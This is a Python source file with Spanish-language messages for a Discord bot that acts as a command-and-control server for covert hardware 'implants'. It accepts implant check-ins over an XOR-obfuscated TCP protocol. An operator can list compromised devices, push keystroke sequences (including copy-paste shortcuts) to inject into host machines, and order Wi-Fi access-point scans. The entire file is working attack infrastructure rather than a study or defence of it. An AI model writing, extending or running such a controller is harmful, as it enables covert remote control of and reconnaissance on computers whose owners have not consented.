from dataclasses import dataclass
import discord
from discord.ext import commands, tasks
import asyncio
import socket
import json
import os
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("ID")
LISTENER_PORT = int(os.getenv("PORT"))
KEY = os.getenv("KEY").encode("utf-8")

implemented_commands = {
    "list": "list -> Lista los implantes conectados",
    "send": "send <DEVICE> <COMMAND> -> Envia un comando al implante (Puedes usar {+ctrl}c{-ctrl}{sleep}{+ctrl}v{-ctrl} para copiar y pegar)",
    "aps": "aps <DEVICE> -> Lista los APs accesibles por el implante fisico",
    "listenv": "listenv -> Muestra las variables de entorno configuradas",
    "exit": "exit <DEVICE> -> Cierra la conexión"
}

# Variables globales
clients = {} 
contadorID=1

@dataclass
class Client:
    ip: str
    ap: str
    bssid: str
    socket: any
    loop: any

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def xor_message(msg):
    xkey = (KEY * ((len(msg) // len(KEY)) + 1))[:len(msg)]
    return bytes(d ^ k for d, k in zip(msg, xkey))

def strip_message(data):
    return data[4:].rstrip(b"\x00").split(b'\xff\xff')[0].decode("utf-8").split(";")

async def check_client(channel, cmd, device, client):
    if not device:
        await print_help(channel, True, cmd)
        return False
    if client is None:
        await channel.send(f"El implante {device} no está conectado ahora mismo")
        return False
    return True

async def print_help(channel, error:False, cmd:None):
    msg=""
    try:
        if cmd is not None:
            error=True
            msg="Sintaxis incorrecta, usa: "
            msg+=implemented_commands.get(cmd)
        else:
            raise Exception
    except:
        if error and cmd is None:
            msg="Comando invalido, estos son los comandos disponibles:\n"

        for cmd, desc in implemented_commands.items():
            msg+=(f"{cmd}: {desc}\n")
    await channel.send(msg)

@bot.event
async def on_ready():
    print(f"Conectado como {bot.user} a Discord.gg")
    channel = await bot.fetch_channel(CHANNEL_ID)
    await channel.send(f"{bot.user} is now on ({datetime.now()})") #TODO EMbeded

    if len(clients.values()):
        await channel.send(f"Todavía no hay ninguna placa conectada" )

    loop = asyncio.get_running_loop()

    tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tsock.setblocking(False)
    tsock.bind(("0.0.0.0",LISTENER_PORT))
    tsock.listen()

    while True:
        conn, addr = await loop.sock_accept(tsock)
        asyncio.create_task(handle_client(conn, loop, channel))

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return  # Ignorar mensajes del propio bot    

    print(f"Mensaje en Discord: {message.author}: {message.content}")
    
    msg=message.content
    channel = await bot.fetch_channel(CHANNEL_ID)

    try:
        parts = msg.split(" ")
        comando = parts[0].lower() if len(parts) > 0 else None
        device = parts[1] if len(parts) > 1 else None
        action = " ".join(parts[2:]) if len(parts) > 2 else None

        client = clients.get(device) if device else None

        match comando:
            case "exit":
                if not await check_client(channel, comando, device, client):
                    return
                await client.loop.sock_sendall(client.socket,xor_message(b'\x03\x00\x01\x07'))
                await channel.send(f"Cerrando conexion a {device}")
            case "aps":
                if not await check_client(channel, comando, device, client):
                    return
                await client.loop.sock_sendall(client.socket,xor_message(b'\x01\x00\x00\x00\xff\xff'))
                await channel.send("El escaneo de red ha devuelto los siguentes APs:")
            case "send":
                if not await check_client(channel, comando, device, client):
                    return
                await client.loop.sock_sendall(client.socket,xor_message(b'\x02\x00\x00\x00'+action.encode("utf-8")+b'\xff\xff'))
            case "list":
                climsg=""
                cs=clients.items()

                if len(cs) == 0:
                    await channel.send(f"No hay ningun implante disponible :(")
                    return

                for name,c in cs:
                    climsg+=f" - {name}: {c.ip} -> {c.ap} ({c.bssid})"
                await channel.send(f"Implantes disponibles:\n {climsg}")
            case "help":
                await print_help(channel, False, None)
            case "listenv":
                await channel.send(f"Estas son las variables de entorno configuradas:\n - PORT: {LISTENER_PORT}\n - KEY: {KEY}")
            case _ :
                raise Exception("Invalid command")
    except Exception as e:
        print(f"Exception raised: {e}")
        await print_help(channel, True, None)

async def handle_client(conn, loop, channel):
    try:
        while True:
            data = await loop.sock_recv(conn, 256)
            if not data:
                continue
            
            decrypt=xor_message(data)

            signature = decrypt[0:4]
            msg = strip_message(decrypt)

            match signature:
                case b"\x0f\x00\x00\x00": # Handshake
                    id,ip,ap,bssid = msg
                    clients[id] = Client(ip, ap, bssid, conn, loop)
                    await channel.send(f"Se ha conectado {id} desde {ap} ({ip})")
                case b"\x00\x00\x00\x00": # AP List
                    apmsg=""
                    for ap in msg:
                        ssid, bssid, sec, rssi = ap.split(":")
                        apmsg+=f"- {ssid} ({bssid}) [{sec}] {rssi}db\n"
                    await channel.send(apmsg)
    except e:
        print(f"An exception occurred handling input message: {e}")
        conn.close()

bot.run(TOKEN)